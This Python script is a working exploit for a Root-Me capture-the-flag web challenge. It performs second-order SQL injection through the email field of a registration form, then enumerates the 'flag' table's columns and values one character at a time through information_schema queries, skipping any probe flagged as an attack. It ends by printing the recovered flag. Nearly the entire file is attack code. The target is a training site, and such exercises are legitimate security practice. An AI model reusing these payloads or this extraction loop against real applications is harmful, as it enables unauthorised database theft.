#!/usr/bin/python

import os
import re
import sys
import time

def urlencode(s):
	ignoreList = list('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_*()')
	acc = ''
	for c in s:
		if c in ignoreList:
			acc += c
		else:
			acc += '%' + hex(ord(c))[2:]
	return acc

class User:
	charList='abcdefghijklmnopqrstuvwxyz'
	def __init__(self, defaultName=''):
		if defaultName != '':
			self.name = defaultName
			self.currentChar = User.charList.index(self.name[-1])
		else:
			self.name = User.charList[0]
			self.currentChar = 0

	def __repr__(self):
		return (self.name)

	def __str__(self):
		return self.name

	def next(self):
		i = 1
		self.name = list(self.name)
		while i <= len(self.name):
			self.name[-i] = User.charList[(User.charList.index(self.name[-i]) + 1) % len(User.charList)]
			if self.name[-i] == User.charList[0]:
				if i == len(self.name):
					self.name = [User.charList[0]] + self.name
					break
				i += 1
			else:
				break
		self.name = ''.join(self.name)

user = User('bkq')
def get_results(e):
	registerPage = "http://challenge01.root-me.org/web-serveur/ch33/?action=register"
	loginPage = "http://challenge01.root-me.org/web-serveur/ch33/?action=login"
	email = urlencode(e)
	request = "curl -s {0} -d 'username={1}&password=a&email={2}'".format(registerPage,user,email)
	s = os.popen(request).read()
	if 'attack' in s:
		return 'attack detected'
	while 'user exist' in s.lower():
		user.next()
		sys.stdout.flush()
		request = "curl -s {0} -d 'username={1}&password=a&email={2}'".format(registerPage,user,email)
		s = os.popen(request).read()
		if 'attack' in s:
			return 'attack detected'
	print(user)
	request = "curl -s {0} -d 'username={1}&password=a'".format(loginPage,user)
	s = os.popen(request).read()
	return s

# Get number of columns in table 'flag'
print("Getting number of columns in table 'flag'")
email = "' + (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='flag') +'"
s = get_results(email)
columnCount = int(re.match('(.*\n)*.*Email : (\d+).*', s).group(2))
print(columnCount)

# Get 'flag' table column names
col = 0
columnFilter = "WHERE table_name='flag'"
columns = []
while col < columnCount:
	# Get length of column name
	print("Getting length of column name")
	email = "' + LENGTH((SELECT column_name FROM information_schema.columns {0} LIMIT 1)) + '".format(columnFilter)
	user.next()
	s = get_results(email)
	col_name_len = int(re.match('(.*\n)*.*Email : (\d+).*', s).group(2))
	print('Column name length: {0}'.format(col_name_len))

	# Get column name
	print('Getting column name')
	i = 0
	colName = ''
	while i < col_name_len:
		c = 32
		while c < 127:
			if chr(c) in "'\\":
				c += 1
				continue
			email = "' or BINARY '{0}' < (SELECT column_name FROM information_schema.columns {1} LIMIT 1) or '".format(colName+chr(c), columnFilter)
			print(email)
			user.next()
			s = get_results(email)
			if s == 'attack detected':
				c += 1
				continue
			m = re.match('(.*\n)*.*Email : (\d+).*', s)
			if not m:
				print(s)
				continue
			result = m.group(2)

			if result == '1':
				c += 1
			elif result == '0':
				if i < col_name_len - 1:
					colName += chr(c-1)
				else:
					colName += chr(c)
				break
		i+=1
	columnFilter += " AND column_name<>'{0}'".format(colName)
	columns.append(colName)
	col += 1

# Get 'flag' table contents
valueFilter = 'WHERE 1=1'
values = {}
for col in columns:
	values[col] = list()
	# Get length of value
	print('Getting length of value in {0}'.format(col))
	email = "' + LENGTH((SELECT {0} FROM flag {1} LIMIT 1)) + '".format(col,valueFilter)
	user.next()
	s = get_results(email)
	value_len = int(re.match('(.*\n)*.*Email : (\d+).*', s).group(2))
	print('Value length: {0}'.format(value_len))

	# Get value
	print('Getting value')
	i = 0
	value = ''
	while i < value_len:
		c = 32
		while c < 127:
			if chr(c) in "'\\":
				c += 1
				continue

			email = "' or BINARY '{0}' < (SELECT {1} FROM flag {2} LIMIT 1) or '".format(value+chr(c), col, valueFilter)
			print(email)
			user.next()
			s = get_results(email)
			if s == 'attack detected':
				c += 1
				continue
			m = re.match('(.*\n)*.*Email : (\d+).*', s)
			if not m:
				print(s)
				continue
			result = m.group(2)

			if result == '1':
				c += 1
			elif result == '0':
				if i < value_len - 1:
					value += chr(c-1)
				else:
					value += chr(c)
				time.sleep(0.5)
				break
		i += 1
	valueFilter += " AND {0}<>'{1}'".format(col,value)
	values[col].append(value)

print(values)
# et on obtient: flag is : moaZ63rVXUhlQ8tVS7Hw
